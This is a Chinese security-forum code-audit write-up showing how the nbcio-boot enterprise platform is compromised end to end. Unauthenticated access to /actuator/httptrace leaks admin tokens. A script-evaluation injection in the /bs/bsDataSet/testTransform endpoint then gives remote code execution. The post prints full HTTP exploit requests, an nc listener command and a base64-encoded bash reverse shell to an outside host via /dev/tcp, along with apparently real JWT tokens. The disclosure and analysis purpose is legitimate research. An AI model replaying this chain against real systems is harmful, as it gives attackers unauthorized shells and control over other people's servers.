---
title: 代码审计之nbcio-boot从信息泄露到Getshell
url: https://forum.butian.net/share/3698
source: 奇安信攻防社区
date: 2024-08-31
fetch_date: 2025-10-06T18:01:10.657205
---

# 代码审计之nbcio-boot从信息泄露到Getshell

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 代码审计之nbcio-boot从信息泄露到Getshell

* [渗透测试](https://forum.butian.net/topic/47)
* [漏洞分析](https://forum.butian.net/topic/48)

利用actuator接口的信息泄露获取token并最终实现未授权RCE

一、项目简介
======
NBCIO 亿事达企业管理平台后端代码，基于jeecgboot3.0和flowable6.7.2，初步完成了集流程设计、流程管理、流程执行、任务办理、流程监控于一体的开源工作流开发平台，同时增加了聊天功能、大屏设计器、网盘功能和项目管理。
项目地址：<https://gitee.com/nbacheng/nbcio-boot>
二、环境搭建
======
只需修改配置文件中的mysql和redis连接信息即可正常运行。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-69ce75e3196e0d778d10e9a9a2239b8eafd89cea.png)
三、未授权分析
=======
在ShiroConfig中放开了actuator方法的未授权访问
org/jeecg/config/shiro/ShiroConfig.java:156
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-4fad000cb6184288b7173d14e5b6d7617e69c6b0.png)
直接访问/actuator/httptrace可以免认证获取管理员的token信息
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-08b79218b25cb5a91836ffbba22800b1c432268b.png)
四、RCE分析
=======
此处代码调用了ScriptEngine的eval方法，此方法若不做特殊处理易引起代码注入问题，这里不做过多解释。
com/nbcio/modules/estar/bs/service/impl/DataSetParamServiceImpl.java:99
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-11071412ac100da644f6bf0c1ade0d9f6ec5a1f8.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-84cc0929d8b76caf0a03b2793988a7046e37eea2.png)
根据方法调用反向跟踪到了/testTransform接口
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-96128d8d6ecd91aa2af958da2877cc405a4f8bf6.png)
由于该接口参数结构较为复杂，所以需要找到前端触发点直接抓包获取参数。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-4c62f1d40eb18b74db0ce9455378bd0e45f4786f.png)
点击测试预览即可触发该接口
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-16e62c04e257435c28d0d7320efde616d91d27af.png)
抓包修改参数并发出请求。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-0efaaf52b2720ab2de016012c3cd2a9152e8b97b.png)
成功触发计算器，本地测试OK
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-b0e54bd013107b519d660aa045b64935ff391a3f.png)
```xml
POST /nbcio-boot/bs/bsDataSet/testTransform HTTP/1.1
Host: 192.168.64.1:8081
Content-Length: 345
Accept: application/json, text/plain, \*/\*
X-TIMESTAMP: 20240808213818
X-Sign: ED5C3621799AA3EAC6D2ABAB498B1DCD
tenant-id: 0
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MjMxMzU3MDAsInVzZXJuYW1lIjoiYWRtaW4ifQ.t5je51OW1Q40U-8d0HudQCXQc-WXQbP7o9cmvKjsO3Y
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: http://218.75.87.38:9888
Referer: http://218.75.87.38:9888/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
{"sourceCode":"mysql","dynSentence":"select \* from bs\_report\_barstack","dataSetParamDtoList":[{"paramName":"","paramDesc":"","paramType":"","sampleItem":"","mandatory":true,"requiredFlag":1,"validationRules":"java.lang.Runtime.getRuntime().exec('calc');"}],"dataSetTransformDtoList":[{"transformType":"js","transformScript":""}],"setType":"sql"}
```
五、漏洞实战
======
### 1、按照第三步获取管理员认证信息
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-44f9f533677ac5a9041359c67265d38e7148503b.png)
```xml
GET /nbcio-boot/actuator/httptrace HTTP/1.1
Host: \*\*\*\*\*
Accept: application/json, text/plain, \*/\*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
```
### 2、打开kali，nc监听指定端口
nc -lvnp 7777
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-8ba0739c028069f76f1badd7622c0338dc3c1463.png)
### 3、发送反弹shell的poc
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-6a3ad267327310d0bdb6fec9faa12972c4751a4d.png)
```xml
POST /nbcio-boot/bs/bsDataSet/testTransform HTTP/1.1
Host: \*\*\*\*
Content-Length: 450
Accept: application/json, text/plain, \*/\*
tenant-id: 0
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MjMyMjgyMTQsInVzZXJuYW1lIjoiYWRtaW4ifQ.oCbEjdP074ORip82D4ix27FtG0WgVnAlc7fjRZeZxgM
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
{"sourceCode":"mysql","dynSentence":"select \* from bs\_report\_barstack","dataSetParamDtoList":[{"paramName":"","paramDesc":"","paramType":"","sampleItem":"","mandatory":true,"requiredFlag":1,"validationRules":"java.lang.Runtime.getRuntime().exec(\"bash -c {echo,YmFzaCAtaT4mIC9kZXYvdGNwLzZ2NzI4NzAyZjYuemljcC5mdW4vNTMyNjcgMD4mMQ==}|{base64,-d}|{bash,-i}\");"}],
"dataSetTransformDtoList":[{"transformType":"js","transformScript":""}],"setType":"sql"}
```
### 4、成功获取到目标shell
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/08/attach-f169880d9a42e4b80531185963b51b0422984c1e.png)
至此，漏洞分析结束。

* 发表于 2024-08-30 10:00:03
* 阅读 ( 5443 )
* 分类：[代码审计](https://forum.butian.net/community/code%20audit)

3 推荐
 收藏

## 2 条评论

[![](https://forum.butian.net/static/images/default_avatar.jpg)](https://forum.butian.net/people/1297)

**[sky666sec](https://forum.butian.net/people/1297)**
2024-09-24 09:07

这种代码审计拿权限看着太爽了

* [0 条评论](#comment-2153)
* 0

请先 [登录](https://forum.butian.net/login) 后评论

[![](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/b3d1a65a9a349e76cae6c929a6c9a4670288ad1.jpeg)](https://forum.butian.net/people/1929)

**[Xc7ACD](https://forum.butian.net/people/1929)**
2025-02-27 10:28

师傅方便加个v交流吗

* [0 条评论](#comment-2352)
* 0

请先 [登录](https://forum.butian.net/login) 后评论

请先 [登录](https://forum.butian.net/login) 后评论

[![fibuleX](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/be8b4f29a3b71b6172b6384087484e8e8ccc5a8.jpg)](https://forum.butian.net/people/26430)

[fibuleX](https://forum.butian.net/people/26430)

3 篇文章

[奇安信攻防社区](https://forum.butian.net)|
联系我们

|
[sitemap](https://forum.butian.net/sitemap)

Copyright © 2013-2023 BUTIAN.NET 版权所有 [京ICP备18014330号-2](https://beian.miit.gov.cn/#/Integrated/index)

×

#### 发送私信

请先 [登录](https://forum.butian.net/login) 后发送私信

×

#### 举报此文章

垃圾广告信息：
广告、推广、测试等内容

违规内容：
色情、暴力、血腥、敏感信息等内容

不友善内容：
人身攻击、挑衅辱骂、恶意行为

其他原因：
请补充说明

举报原因:

取消
举报

×

#### ![fibuleX](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/be8b4f29a3b71b6172b6384087484e8e8ccc5a8.jpg)

如果觉得我的文章对您有用，请随意打赏。你的支持将鼓励我继续创作！

![]()

---